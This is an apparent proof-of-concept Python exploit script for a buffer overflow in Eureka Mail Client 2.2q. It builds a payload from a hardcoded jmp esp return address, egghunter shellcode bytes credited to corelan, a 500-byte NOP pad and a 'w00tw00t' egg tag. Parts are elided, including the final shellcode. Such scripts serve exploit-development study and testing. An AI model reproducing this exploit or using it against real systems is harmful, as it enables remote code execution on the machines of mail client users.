#!/usr/bin/python
# Eureka Mail Client 2.2q Buffer Overflow using egghunter
...
# jmp esp instruction at 0x7e429353
ret = "\x53\x93\x42\x7e"
# egghunter code ripped straight from corelan
egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8"
egghunter += "\x77\x30\x30\x74"
egghunter += "\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
# totally random offset, just to throw code somewhere in memory far from esp
padding = "\x90" * 500
# the egg
buff_prepend = "w00tw00t"
...
payload = prepend + eip_offset + ret + egghunter + padding + buff_prepend + buf
